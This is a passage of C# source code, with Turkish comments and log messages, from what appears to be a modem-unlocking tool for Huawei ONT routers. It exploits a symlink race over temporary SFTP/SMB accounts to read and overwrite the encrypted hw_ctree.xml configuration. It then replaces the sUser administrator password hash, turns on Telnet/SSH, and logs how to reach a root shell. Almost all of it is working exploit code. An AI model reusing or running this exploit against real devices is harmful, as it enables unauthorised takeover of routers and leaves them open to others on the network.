    private async Task<byte[]> RaceAsync(string target, int minLen, int maxLen)
    {
        string helper = HelperYaz();
        try
        {
            string python = PythonPath;
            try
            {
                if (Process.Start(new ProcessStartInfo(python, "-c \"import sys;print(1)\"")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }).StandardOutput.ReadToEnd().Trim() != "1")
                    python = "python";
            }
            catch
            {
                python = "python";
            }
            if (python == "python")
            {
                foreach (string aday in new string[] { "python3", "python", "py" })
                {
                    try
                    {
                        if (Process.Start(new ProcessStartInfo(aday, "-c \"import sys;print(1)\"")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }).StandardOutput.ReadToEnd().Trim() == "1")
                        {
                            python = aday;
                            break;
                        }
                    }
                    catch { }
                }
            }
            ProcessStartInfo si = new ProcessStartInfo
            {
                FileName = python,
                Arguments = $"\"{helper}\" {_ip} {ShareName()} {SmbUser} {SmbPass} {8022} {SftpUser} {SftpPass} {minLen} {maxLen} 600 {target}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            TaskCompletionSource<byte[]> done = new TaskCompletionSource<byte[]>(TaskCreationOptions.RunContinuationsAsynchronously);
            _ct.Register(delegate { done.TrySetCanceled(_ct); });
            byte[] sonuc = null;
            Process proc = Process.Start(si);
            _ = Task.Run(delegate
            {
                string satir;
                while ((satir = proc.StandardOutput.ReadLine()) != null)
                {
                    if (satir.StartsWith("FOUND:"))
                    {
                        sonuc = Convert.FromBase64String(satir.Substring(6, satir.Length - 6));
                        done.TrySetResult(sonuc);
                    }
                }
            }, _ct);
            _ = Task.Run(delegate
            {
                string satir;
                while ((satir = proc.StandardError.ReadLine()) != null)
                {
                    if (satir.Trim().Length > 0)
                        L("! [Yardımcı] " + satir.Trim());
                }
            }, _ct);
            proc.EnableRaisingEvents = true;
            _ = Task.Run(delegate
            {
                proc.WaitForExit();
                done.TrySetResult(sonuc ?? Array.Empty<byte>());
            }, _ct);
            await Task.WhenAny(done.Task, Task.Delay(TimeSpan.FromMinutes(11), _ct));
            try
            {
                if (!proc.HasExited) proc.Kill();
            }
            catch { }
            byte[] bitti = done.Task.IsCompleted ? (await done.Task) : null;
            if (bitti == null || bitti.Length == 0)
            {
                if (_symlinkSorunu)
                    throw new TimeoutException("Veri okuma zaman aşımına uğradı — dosya erişim köprüsü kurulamadığı için okunamıyor. USB belleği NTFS olarak formatlayıp modeme takın ve tekrar BAŞLAT'a basın.");
                throw new TimeoutException("Veri okuma zaman aşımına uğradı — tekrar BAŞLAT'a basın.");
            }
            return bitti;
        }
        finally
        {
            try { File.Delete(helper); } catch { }
        }
    }

    /// <summary>
    /// sUSER ŞİFRE YAZMA: hw_ctree.xml'i oku, sUser Password/Salt'ı BİLDİĞİMİZ şifreyle
    /// yeniden hesapla (PBKDF2-SHA256 5000 tur), X_HW_IteratePassword düğümünü güncelle,
    /// geri şifrele, yaz. Orijinal blob + XML yedeklenir. Dönüş: yeni şifre (başarı) ya da null.
    /// </summary>
    /// <summary>sUser web şifresi (temizlik girişi için MainWindow doldurur).</summary>
    public string SuserPass { get; set; } = "";
    /// <summary>Yazma sonrası yarış için açılan SFTP/SMB hesapları temizlensin mi?</summary>
    public bool HesapTemizle { get; set; } = true;

    /// <summary>
    /// Yarış için açılan kalıcı SFTP sunucusu + hekz/hekzs hesaplarını kapatır/siler.
    /// Bu hesaplar cihaz config'ine YAZILIYOR (reboot'ta bile kalıyor — canlı doğrulandı)
    /// ve LAN'daki herkese USB/symlink üzerinden yazma yolu açabiliyor — bu yüzden
    /// işlem bitince temizlenmeleri gerekir. Eski koşulardan kalanlar da temizlenir.
    /// </summary>
    public async Task HesaplariTemizleAsync()
    {
        try
        {
            using var web = new OntWeb(_ip);
            bool girildi = false;
            if (SuserPass.Length > 0)
                girildi = await web.LoginAsync("sUser", SuserPass, _ct) && await web.SessionAliveAsync(_ct);
            if (!girildi)
            {
                await Task.Delay(1500, _ct); // tek-oturumlu cihaz: önceki kısılmış oturumun kapanmasını bekle
                girildi = await web.LoginAsync("admin", _adminPass, _ct) && await web.SessionAliveAsync(_ct);
            }
            if (!girildi) { L("! Hesap temizliği: oturum kurulamadı (elle: USB Depolama → dosya paylaşımını kapat)"); return; }

            try
            {
                await web.PostFormAsync("setajax.cgi?x=InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ServerInfo&RequestFile=html/ssmp/usbftp/usbhost.asp",
                    "x.SftpEnable=0&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                    web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
                L("[SFTP] Geçici SFTP servisi kapatıldı ✓");
            }
            catch (Exception ex) { L("! [SFTP] Servis kapatılamadı: " + ex.Message); }

            try
            {
                string sayfa = OntWeb.Unescape(await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct));
                int silinen = 0;
                foreach (Match m in Regex.Matches(sayfa, "X_HW_SFTP_ClientInfo\\.(\\d+)\",\"[^\"]*\",\"([^\"]+)\""))
                {
                    if (m.Groups[2].Value != SftpUser) continue;
                    await web.PostFormAsync("del.cgi?RequestFile=html/ssmp/usbftp/usbhost.asp",
                        Uri.EscapeDataString("InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ClientInfo." + m.Groups[1].Value)
                        + "=&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                        web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
                    silinen++;
                    await Task.Delay(1200, _ct);
                }
                L(silinen > 0 ? $"[SFTP] Geçici SFTP hesabı temizlendi ({silinen} adet) ✓" : "[SFTP] Geçici SFTP hesabı zaten kaldırılmış");
            }
            catch (Exception ex) { L("! [SFTP] Hesap silinemedi: " + ex.Message); }

            try
            {
                string sayfa = OntWeb.Unescape(await web.GetPageAsync("html/ssmp/samba/sambasmart.asp", _ct));
                int silinen = 0;
                foreach (Match m in Regex.Matches(sayfa,
                    "(InternetGatewayDevice\\.Services\\.StorageService\\.1\\.UserAccount\\.\\d+)\",\"" + SmbUser + "\""))
                {
                    await web.PostFormAsync("del.cgi?RequestFile=html/ssmp/samba/sambasmart.asp",
                        Uri.EscapeDataString(m.Groups[1].Value) + "=&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                        web.Base + "/html/ssmp/samba/sambasmart.asp", _ct);
                    silinen++;
                    await Task.Delay(1500, _ct);
                }
                L(silinen > 0 ? $"[SMB] Geçici SMB hesabı temizlendi ({silinen} adet) ✓" : "[SMB] Geçici SMB hesabı zaten kaldırılmış");
            }
            catch (Exception ex) { L("! [SMB] Hesap silinemedi: " + ex.Message); }
        }
        catch (Exception ex)
        {
            L("! [Temizlik] Hesap temizliği hatası: " + ex.Message);
        }
    }

    private string TelnetCliDuzenle(string xml, string yeniSifre)
    {
        string once = xml;
        xml = xml.Replace("TELNETLanEnable=\"0\"", "TELNETLanEnable=\"1\"");
        xml = xml.Replace("SSHLanEnable=\"0\"", "SSHLanEnable=\"1\"");
        xml = xml.Replace("<X_HW_CLITelnetAccess Access=\"0\"", "<X_HW_CLITelnetAccess Access=\"1\"");
        if (xml != once)
            L("  Telnet + SSH yerel ağ erişimi etkinleştirildi ✓");
        else
            L("  ! Telnet/SSH bayrakları bulunamadı — zaten açık ya da farklı sürüm");

        var mCli = Regex.Match(xml, "<X_HW_CLIUserInfoInstance\\b[^>]*Username=\"sUser\"[^>]*>");
        if (mCli.Success)
        {
            string cliTag = mCli.Value;
            string cliSalt = WebUtility.HtmlDecode(Regex.Match(cliTag, "Salt=\"([^\"]*)\"").Groups[1].Value);
            if (cliSalt.Length > 0)
            {
                var cliOzet = Rfc2898DeriveBytes.Pbkdf2(
                    Encoding.UTF8.GetBytes(yeniSifre), Encoding.UTF8.GetBytes(cliSalt), 5000,
                    HashAlgorithmName.SHA256, 32);
                string cliPw = Dollar2.Encrypt(Convert.ToHexString(cliOzet).ToLowerInvariant());
                string cliPwAttr = cliPw
                    .Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;")
                    .Replace("\"", "&quot;").Replace("'", "&apos;");
                string cliYeni = Regex.Replace(cliTag, @"Userpassword=""\$2[^""]*""",
                    m => "Userpassword=\"" + cliPwAttr + "\"");
                xml = xml.Replace(cliTag, cliYeni);
                L("  Komut satırı (CLI) yönetici parolası web parolasıyla eşitlendi ✓");
            }
            else L("  ! CLI düğümünde anahtar bulunamadı — CLI şifresi eski kalmış olabilir");
        }
        return xml;
    }

    public async Task<string> SuserYazWebAsync(string sUserPass, string ozelYeniSifre = null)
    {
        LogMaskeleyici.GizliDegerEkle(sUserPass);
        var T = Stopwatch.StartNew();
        void Adim(string ad) => L($"[[{T.Elapsed.TotalSeconds,6:0.0}s] {ad}");
        L("========== sUSER ŞİFRE YAZMA (WEB — yarışsız) BAŞLIYOR ==========");
        _phase("Web geri yükleme yöntemi hazırlanıyor...");
        try
        {
            var web = new OntWeb(_ip);
            Adim("sUser girişi...");
            (bool ok, string detay) = await web.HttpLoginAsync("sUser", sUserPass, _ct);
            if (!ok || !(await web.SessionAliveAsync(_ct)))
                throw new Exception("sUser oturumu kurulamadı (" + detay + ") — sUser şifresi yanlış olabilir: " +
                    "BAŞLAT'ı çalıştırın ya da cihazdaki güncel sUser şifresini kontrol edin");
            L("  sUser yönetici oturumu doğrulandı ✓");

            _phase("Aşama 1/3: Konfigürasyon indiriliyor...");
            byte[] ham = await web.DownloadConfigBackupAsync(_ct);
            if (ham == null || ham.Length < 512)
                throw new Exception("Modem yapılandırması indirilemedi (oturum yetkisi ya da erişim kısıtı)");
            string xml = Encoding.UTF8.GetString(ham);
            Adim($"Yapılandırma indirildi ({ham.Length:N0} bayt)");
            if (!xml.Contains("<InternetGatewayDevice"))
                throw new Exception("İndirilen içerik geçerli yapılandırma formatında değil");

            _phase("Aşama 2/3: sUser ve Telnet/SSH parametreleri yapılandırılıyor...");
            var mBlok = Regex.Match(xml,
                @"<X_HW_WebUserInfoInstance[^>]*UserName=""sUser""[^>]*>.*?</X_HW_WebUserInfoInstance>",
                RegexOptions.Singleline);
            if (!mBlok.Success)
                throw new Exception("sUser hesabı yapılandırmada bulunamadı");
            string blok = mBlok.Value;

            var yeniSifre = string.IsNullOrWhiteSpace(ozelYeniSifre) ? ("Hekz" + RndDigits(8)) : ozelYeniSifre.Trim();
            LogMaskeleyici.GizliDegerEkle(yeniSifre);

            string mainSalt = WebUtility.HtmlDecode(Regex.Match(blok, " Salt=\"([^\"]*)\"").Groups[1].Value);
            if (mainSalt.Length == 0) throw new Exception("sUser bloğunda güvenlik anahtarı bulunamadı");
            var ozet = Rfc2898DeriveBytes.Pbkdf2(
                Encoding.UTF8.GetBytes(yeniSifre), Encoding.UTF8.GetBytes(mainSalt), 5000,
                HashAlgorithmName.SHA256, 32);
            string yeniHex = Convert.ToHexString(ozet).ToLowerInvariant();
            string yeniPw = Dollar2.Encrypt(yeniHex);
            string yeniPwAttr = yeniPw
                .Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;")
                .Replace("\"", "&quot;").Replace("'", "&apos;");
            L("  Yeni yönetici parolası hazırlandı: ********");
            L("  Ana parola özeti güncellendi ✓");

            string blokYeni = Regex.Replace(blok, @"(?<![A-Za-z])Password=""\$2[^""]*""",
                m => "Password=\"" + yeniPwAttr + "\"");

            var mIter = Regex.Match(blokYeni, "<X_HW_IteratePassword[^>]*Salt=\"([^\"]*)\"[^>]*IterateCount=\"([^\"]*)\"");
            if (mIter.Success)
            {
                string iterSalt = WebUtility.HtmlDecode(mIter.Groups[1].Value);
                int iterCount = int.TryParse(mIter.Groups[2].Value, out int ic) && ic > 0 ? ic : 10000;
                var iterOzet = Rfc2898DeriveBytes.Pbkdf2(
                    Encoding.UTF8.GetBytes(yeniSifre), Encoding.UTF8.GetBytes(iterSalt), iterCount,
                    HashAlgorithmName.SHA256, 32);
                string iterPw = Dollar2.Encrypt(Convert.ToHexString(iterOzet).ToLowerInvariant());
                string iterPwAttr = iterPw
                    .Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;")
                    .Replace("\"", "&quot;").Replace("'", "&apos;");
                blokYeni = Regex.Replace(blokYeni,
                    @"(<X_HW_IteratePassword[^>]*Password="")\$2[^""]*("")",
                    m => m.Groups[1].Value + iterPwAttr + m.Groups[2].Value);
                L($"  Doğrulama parola özeti güncellendi ({iterCount} tur) ✓");
            }
            else L("  ! İkincil doğrulama düğümü yok — cihaz ana paroladan doğrular");

            var hesap = WebHesaplariCek(xml.Replace(blok, blokYeni)).FirstOrDefault(h => h.User == "sUser");
            if (hesap == null || !SifreDogrula(hesap, yeniSifre))
                throw new Exception("Öz-doğrulama başarısız — düzenlenen şifre doğrulayıcıdan geçmedi (yazılmadı)");
            L("  öz-doğrulama: yeni şifre formatı DOĞRULANDI ✓");

            xml = xml.Replace(blok, blokYeni);

            if (TelnetSshAc) xml = TelnetCliDuzenle(xml, yeniSifre);

            var yedekDizin = Path.Combine(MasaustuDizini(),
                "HekzONT", $"suser_web_yedek_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(yedekDizin);
            File.WriteAllBytes(Path.Combine(yedekDizin, "hw_ctree_web_orijinal.xml"), ham);
            File.WriteAllText(Path.Combine(yedekDizin, "hw_ctree_web_duzenli.xml"), xml);
            L("  YEDEK: " + yedekDizin);

            _phase("Aşama 3/3: Güncellenen konfigürasyon cihaza yükleniyor...");
            var (upOk, upDetay) = await web.UploadConfigRestoreAsync(Encoding.UTF8.GetBytes(xml), "hw_ctree.xml", _ct);
            L("  upload: " + upDetay);
            if (!upOk)
            {
                L("  X cihaz yüklemeyi reddetti — yarışsız yol bu yazılımda kapalı olabilir; yarış yolunu kullan");
                return null;
            }
            Adim("UPLOAD OK — cihaz config'i işliyor");
            L("");
            L("*** Cihaz yapılandırmayı geri yükledi. Değişikliklerin aktif olması için yeniden başlatılıyor.");
            if (TelnetSshAc)
            {
                L("*** Yeniden başlatma sonrası Telnet/SSH AÇIK: 'ssh root@192.168.1.1' veya 'telnet 192.168.1.1'");
                L("***   Giriş: sUser / ********  →  WAP> su  →  SU_WAP> shell  →  tam root (#)");
            }
            L("*** Yeni sUser parolası tanımlandı: ******** (Sonuçlar sekmesinden görüntüleyebilirsiniz)");
            L("*** Yedek: " + yedekDizin);
            SuserPass = yeniSifre;
            L($"========== sUSER WEB YAZMA TAMAM ({T.Elapsed.TotalSeconds:0.0} sn) ==========");
            return yeniSifre;
        }
        catch (Exception ex)
        {
            L("X WEB yazma hatası: " + ex.Message);
            L("  (yarışsız yol başarısızsa klasik yarış yolunu kullan)");
            return null;
        }
    }

    public async Task<string> SuserYazAsync(string ozelYeniSifre = null)
    {
        var T = Stopwatch.StartNew();
        void Adim(string ad) => L($"[[{T.Elapsed.TotalSeconds,6:0.0}s] {ad}");
        string Hex16(byte[] b) => Convert.ToHexString(b[..Math.Min(16, b.Length)]);

        L("========== sUSER ŞİFRE YAZMA BAŞLIYOR ==========");
        try
        {
            Adim("kurulum");
            await SetupAsync();
            Adim("kurulum tamam");

            _phase("Aşama 1/5: Cihaz ayar veritabanı okunuyor...");
            SetupWithRetry("/mnt/jffs2/hw_ctree.xml");
            var orijinal = await RaceAsync("/mnt/jffs2/hw_ctree.xml", 56, 512 * 1024);
            Adim($"OKUNDU: {orijinal.Length:N0} bayt | başlık {Hex16(orijinal)}");
            try
            {
                var imzaYol = Path.Combine(MasaustuDizini(), "HekzONT", "son_yazilan_imza.txt");
                if (File.Exists(imzaYol))
                {
                    var onceki = File.ReadAllText(imzaYol).Trim();
                    L(onceki == Hex16(orijinal)
                        ? $"  >>> AKTİF DOSYA = ÖNCEKİ YAZIMIZ ({onceki}) — flash'ta kalmış ama cihaz BENİMSEMİŞ/YÜKLEMEMİŞ <<<"
                        : $"  >>> aktif dosya önceki yazımızdan FARKLI — flash'a inmemiş (cache) ya da daemon geri yazmış <<<");
                }
            }
            catch { }

            _phase("Aşama 2/5: Veritabanı çözülüyor ve yedekleniyor...");
            var coz = HuaweiCrypto.Decrypt(orijinal);
            if (!coz.HmacValid) L("  ! HMAC geçersiz — devam ama riskli");
            string xml;
            if (coz.Plain.Length >= 2 && coz.Plain[0] == 0x1f && coz.Plain[1] == 0x8b)
            {
                using var ms = new MemoryStream(coz.Plain);
                using var gz = new GZipStream(ms, CompressionMode.Decompress);
                using var cs2 = new MemoryStream();
                gz.CopyTo(cs2);
                xml = Encoding.UTF8.GetString(cs2.ToArray());
            }
            else xml = coz.PlainText;
            Adim($"Yapılandırma çözüldü: {xml.Length:N0} karakter");
            var yedekDizin = Path.Combine(MasaustuDizini(),
                "HekzONT", $"suser_yedek_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(yedekDizin);
            File.WriteAllBytes(Path.Combine(yedekDizin, "hw_ctree_orijinal.bin"), orijinal);
            File.WriteAllText(Path.Combine(yedekDizin, "hw_ctree_dec.xml"), xml);
            L($"  YEDEK: {yedekDizin}");

            _phase("Aşama 3/5: sUser yönetici şifresi yeniden hesaplanıyor...");
            var mBlok = Regex.Match(xml,
                @"<X_HW_WebUserInfoInstance[^>]*UserName=""sUser""[^>]*>.*?</X_HW_WebUserInfoInstance>",
                RegexOptions.Singleline);
            if (!mBlok.Success)
            {
                var bulunan = string.Join(", ",
                    Regex.Matches(xml, @"<X_HW_WebUserInfoInstance[^>]*UserName=""([^""]*)""")
                        .Select(m => m.Groups[1].Value));
                throw new Exception($"sUser girişi yapılandırmada yok. Bulunan kullanıcılar: {bulunan}");
            }
            var blok = mBlok.Value;
            Adim($"sUser hesabı bulundu ({blok.Length} karakter)");

            var yeniSifre = string.IsNullOrWhiteSpace(ozelYeniSifre) ? ("Hekz" + RndDigits(8)) : ozelYeniSifre.Trim();
            LogMaskeleyici.GizliDegerEkle(yeniSifre);
            var mevcutSalt = WebUtility.HtmlDecode(Regex.Match(blok, " Salt=\"([^\"]*)\"").Groups[1].Value);
            if (mevcutSalt.Length == 0) throw new Exception("sUser bloğunda güvenlik anahtarı bulunamadı");
            var ozet = Rfc2898DeriveBytes.Pbkdf2(
                Encoding.UTF8.GetBytes(yeniSifre), Encoding.UTF8.GetBytes(mevcutSalt), 5000,
                HashAlgorithmName.SHA256, 32);
            var sifreliDeger = Dollar2.Encrypt(Convert.ToHexString(ozet).ToLowerInvariant());
            var sifreliAttr = sifreliDeger
                .Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;")
                .Replace("\"", "&quot;").Replace("'", "&apos;");
            L("  Yeni yönetici parolası hazırlandı: ********");
            L("  Güvenlik anahtarı korundu (PBKDF2-SHA256 5000 tur)");

            var blokYeni = blok;
            if (PaketTesti)
            {
                L("  PAKET TESTİ: içerik hiç değiştirilmiyor (sadece yeniden şifreleme)");
                L("  amaç: reboot sonrası admin girişi ÇALIŞMALI — paketleme temiz demektir");
            }
            else
            {
                blokYeni = Regex.Replace(blok, @"(?<![A-Za-z])Password=""\$2[^""]*""",
                    m => "Password=\"" + sifreliAttr + "\"");
                var mIter = Regex.Match(blokYeni, @"<X_HW_IteratePassword[^>]*Salt=""([^""]*)""");
                if (mIter.Success)
                {
                    var iterSalt = mIter.Groups[1].Value;
                    var iterOzet = Rfc2898DeriveBytes.Pbkdf2(
                        Encoding.ASCII.GetBytes(yeniSifre), Encoding.ASCII.GetBytes(iterSalt), 10000,
                        HashAlgorithmName.SHA256, 32);
                    var iterDeger = Dollar2.Encrypt(Convert.ToHexString(iterOzet).ToLowerInvariant())
                        .Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;")
                        .Replace("\"", "&quot;").Replace("'", "&apos;");
                    blokYeni = Regex.Replace(blokYeni, @"(<X_HW_IteratePassword[^>]*Password="")\$2[^""]*("")",
                        m => m.Groups[1].Value + iterDeger + m.Groups[2].Value);
                    L("  Doğrulama parola özeti güncellendi (10000 tur) ✓");
                }
                else L("  İkincil doğrulama düğümü yok — cihaz 5000-tur yoldan doğrular");
                L("  Parola alanları güncellendi ✓");
            }
            if (blokYeni == blok && !PaketTesti) throw new Exception("Yapılandırma değişikliği uygulanamadı (eşleşme yok)");

            xml = xml.Replace(blok, blokYeni);

            if (TelnetSshAc && !PaketTesti) xml = TelnetCliDuzenle(xml, yeniSifre);

            _phase("Aşama 4/5: Yeni paket şifreleniyor ve yazılıyor...");
            byte[] gzYeni;
            using (var msw = new MemoryStream())
            {
                using (var gz = new GZipStream(msw, CompressionLevel.Optimal, true))
                    gz.Write(Encoding.UTF8.GetBytes(xml));
                gzYeni = msw.ToArray();
            }
            var yeni = HuaweiCrypto.Encrypt(gzYeni, orijinal[..8]);
            Adim($"Yeni yapılandırma bloğu: {yeni.Length:N0} bayt | başlık {Hex16(yeni)}");
            try
            {
                var imzaDiz = Path.Combine(MasaustuDizini(), "HekzONT");
                Directory.CreateDirectory(imzaDiz);
                File.WriteAllText(Path.Combine(imzaDiz, "son_yazilan_imza.txt"), Hex16(yeni));
            }
            catch { }
            var yazildi = await YazmaYarisiAsync("/mnt/jffs2/hw_ctree.xml", yeni);
            if (!yazildi) { L("========== sUSER YAZMA BAŞARISIZ (dosya değişmedi) =========="); return null; }
            Adim("YAZMA OK + geri okuma eşleşti");

            _phase("Aşama 5/5: Belleğe sürekli yazma başlatılıyor...");
            try
            {
                using var sftp3 = new SftpClient(_ip, SftpPort, SftpUser, SftpPass)
                { OperationTimeout = TimeSpan.FromSeconds(15) };
                sftp3.Connect();
                foreach (var n in new[] { "lnk2.bin", "lnk3.bin" })
                    Try(sftp3, () => sftp3.Delete(n));
                Try(sftp3, () => SftpSymLink.Create(sftp3, "/mnt/jffs2/hw_ctree_bak.xml", "lnk2.bin"));
                Try(sftp3, () => SftpSymLink.Create(sftp3, "/mnt/jffs2/hw_ctree_backup.xml", "lnk3.bin"));
                sftp3.Disconnect();
                L("  Yedek yapılandırma hedefleri bağlandı ✓");
            }
            catch (Exception ex) { L("  Yedek erişim köprüsü kurulamadı: " + ex.Message); }
            L("");
            L("############################################################");
            L("#  60 SANİYE boyunca kesintisiz yazılacak.                #");
            L("#  Faz: GÖNÜLLÜ DOSYA BİZDE — o an FİŞİ ÇEK!              #");
            L("#  Faz: daemon sildi — 1-2 sn'de tekrar bizde olur, bekle #");
            L("############################################################");
            var payloadDosya2 = Path.Combine(Path.GetTempPath(), "hekz_py_" + Guid.NewGuid().ToString("N")[..8] + ".bin");
            File.WriteAllBytes(payloadDosya2, yeni);
            try
            {
                var pyExe2 = PyBul.Bul(PythonPath);
                var args2 = HelperYaz() + " " + _ip + " " + ShareName() + " " + SmbUser + " " + SmbPass
                          + " " + SftpPort + " " + SftpUser + " " + SftpPass
                          + " " + yeni.Length + " " + yeni.Length + " 60 /mnt/jffs2/hw_ctree.xml"
                          + " " + payloadDosya2 + " loop";
                var psi2 = new ProcessStartInfo
                { FileName = pyExe2, Arguments = args2, RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true };
                var dondu2 = new TaskCompletionSource<bool>(TaskCreationOptions.RunContinuationsAsynchronously);
                _ct.Register(() => dondu2.TrySetCanceled(_ct));
                var proc2 = Process.Start(psi2)!;
                var yazmaSay = 0;
                string _sonWerr2 = null;
                int _werrTekrar2 = 0;
                void WerrLogla2(string mesaj)
                {
                    string temiz = mesaj.Trim();
                    if (temiz.StartsWith("? ")) temiz = temiz[2..];
                    var mOf = System.Text.RegularExpressions.Regex.Match(temiz, @"OperationFailure\('([^']+)'");
                    if (mOf.Success) temiz = mOf.Groups[1].Value;
                    if (temiz == _sonWerr2) { _werrTekrar2++; return; }
                    if (_werrTekrar2 > 0) L($"  ... (yukarıdaki {_werrTekrar2}x tekrar)");
                    _sonWerr2 = temiz; _werrTekrar2 = 0;
                    L($"  ! {temiz}");
                }
                _ = Task.Run(() =>
                {
                    string l;
                    while ((l = proc2.StandardOutput.ReadLine()) != null)
                    {
                        if (l.StartsWith("WLOOP:")) { yazmaSay = int.Parse(l[6..]); }
                        else if (l.Trim() == "WSTAT:1") { if (_werrTekrar2 > 0) { L($"  ... (yukarıdaki {_werrTekrar2}x tekrar)"); _werrTekrar2 = 0; } L(""); L($"  DOSYA BİZDE ({yazmaSay} yazma) — FİŞİ ŞİMDİ ÇEK!"); _phase($"DOSYA YAZILDI! Cihaz fişini çekin ({yazmaSay}. deneme)"); }
                        else if (l.Trim() == "WSTAT:0") { L($"  Arka plan servisi geri yazdı — tekrar yazılıyor ({yazmaSay})..."); _phase($"Yeniden yazılıyor ({yazmaSay})..."); }
                        else if (l.Trim() == "SMBFAIL") L("  ! SMB bağlantısı yok!");
                        else if (l.Trim() == "LDEAD") L("  Cihaz yanıt vermiyor — fiş çekildi kabul edildi ✓");
                        else if (l.StartsWith("WERR:"))
                        {
                            var k = l[5..];
                            var msg = k.Contains(':') ? k[(k.IndexOf(':') + 1)..] : k;
                            WerrLogla2(msg);
                        }
                    }
                    if (_werrTekrar2 > 0) L($"  ... (yukarıdaki {_werrTekrar2}x tekrar)");
                    dondu2.TrySetResult(true);
                }, _ct);
                _ = Task.Run(() => { string e; while ((e = proc2.StandardError.ReadLine()) != null) if (e.Trim().Length > 0) L("  ! " + e.Trim()); }, _ct);
                await Task.WhenAny(dondu2.Task, Task.Delay(TimeSpan.FromSeconds(75), _ct));
                try { if (!proc2.HasExited) proc2.Kill(); } catch { }
                L("");
                L("*** Döngü bitti. Fiş çekildiyse: cihaz açılınca yeni sUser parolanız (********) ile giriş yapabilirsiniz.");
                L("***    Fiş çekilmediyse: yapılandırma eski haline dönmüştür — tekrar deneyin.");
                if (TelnetSshAc && !PaketTesti)
                {
                    L("*** Telnet/SSH: 'ssh root@192.168.1.1' veya 'telnet 192.168.1.1'");
                    L("***    Giriş: sUser / ********  →  WAP> su  →  SU_WAP> shell  →  tam root (#)");
                }
                L("*** Yedek: " + yedekDizin);
            }
            finally
            {
                try { File.Delete(payloadDosya2); } catch { }
            }
            SuserPass = yeniSifre;
            L($"========== sUSER YAZMA TAMAM ({T.Elapsed.TotalSeconds:0.0} sn) ==========");
            return yeniSifre;
        }
        finally
        {
            await TemizlikAsync();
            if (HesapTemizle) await HesaplariTemizleAsync();
        }
    }

    /// <summary>Yazma yarışı: hedefe payload yazar, geri-okuma doğrulaması ile.</summary>
    private async Task<bool> YazmaYarisiAsync(string hedef, byte[] payload)
    {
        var T = Stopwatch.StartNew();
        void Adim(string ad) => L($"[[{T.Elapsed.TotalSeconds,6:0.0}s] {ad}");

        _phase("Yazma kanalı ve dosya köprüsü hazırlanıyor...");
        try
        {
            using var sftp = new SftpClient(_ip, SftpPort, SftpUser, SftpPass)
            { OperationTimeout = TimeSpan.FromSeconds(15), KeepAliveInterval = TimeSpan.FromSeconds(15) };
            sftp.Connect();
            Adim($"SFTP bağlı ({_ip}:{SftpPort})");
            foreach (var n in new[] { "cur.bin", "real.bin", "lnk.bin", "lnk2.bin", "lnk3.bin" })
            {
                Try(sftp, () => sftp.Delete(n));
            }
            Adim("Geçici çalışma alanı temizlendi");
            Try(sftp, () => sftp.WriteAllText("real.bin", "R"));
            Adim($"Geçici aktarım dosyası hazır ({(Lstat(sftp, "real.bin") != null ? "doğrulandı ✓" : "DOĞRULANAMADI !")})");
            Try(sftp, () => SftpSymLink.Create(sftp, hedef, "lnk.bin"));
            var lattr = Lstat(sftp, "lnk.bin");
            Adim($"Dosya erişim köprüsü ({(lattr?.IsSymbolicLink == true ? "doğrulandı ✓" : "KURULAMADI !!")})");
            if (lattr?.IsSymbolicLink != true)
                L("  ! Dosya erişim köprüsü oluşamadı — işlem muhtemelen başarısız olacak");
            L("Yazma işlemi başladı");
        }
        catch (Exception ex)
        {
            L($"X Yazma kurulum hatası: {ex.GetType().Name}: {ex.Message}");
            return false;
        }

        var payloadDosya = Path.Combine(Path.GetTempPath(), "hekz_py_" + Guid.NewGuid().ToString("N")[..8] + ".bin");
        File.WriteAllBytes(payloadDosya, payload);
        L($"  Veri paketi hazırlandı ({payload.Length:N0} bayt)");
        try
        {
            var pyExe = PyBul.Bul(PythonPath);
            var args = HelperYaz() + " " + _ip + " " + ShareName() + " " + SmbUser + " " + SmbPass
                     + " " + SftpPort + " " + SftpUser + " " + SftpPass
                     + " " + payload.Length + " " + payload.Length + " 150 " + hedef
                     + " " + payloadDosya;
            L($"  Aktarım yardımcısı başlatıldı ({Path.GetFileName(pyExe)})");
            var psi = new ProcessStartInfo
            { FileName = pyExe, Arguments = args, RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true };
            var done = new TaskCompletionSource<byte[]>(TaskCreationOptions.RunContinuationsAsynchronously);
            _ct.Register(() => done.TrySetCanceled(_ct));
            byte[] sonuc = null;
            var proc = Process.Start(psi)!;
            Adim("Aktarım süreci başladı (PID " + proc.Id + ")");
            string _sonWerr = null;
            int _werrTekrar = 0;
            void WerrLogla(string mod, string mesaj)
            {
                string temiz = mesaj.Trim();
                if (temiz.StartsWith("? ")) temiz = temiz[2..];
                var mOf = System.Text.RegularExpressions.Regex.Match(temiz, @"OperationFailure\('([^']+)'");
                if (mOf.Success) temiz = mOf.Groups[1].Value;
                if (temiz == _sonWerr) { _werrTekrar++; return; }
                if (_werrTekrar > 0) L($"  ... (yukarıdaki {_werrTekrar}x tekrar)");
                _sonWerr = temiz; _werrTekrar = 0;
                L($"  ! [{mod}] {temiz}");
            }
            bool wokLogged = false;
            _ = Task.Run(() =>
            {
                string l;
                while ((l = proc.StandardOutput.ReadLine()) != null)
                {
                    if (l.StartsWith("WROTE:"))
                    {
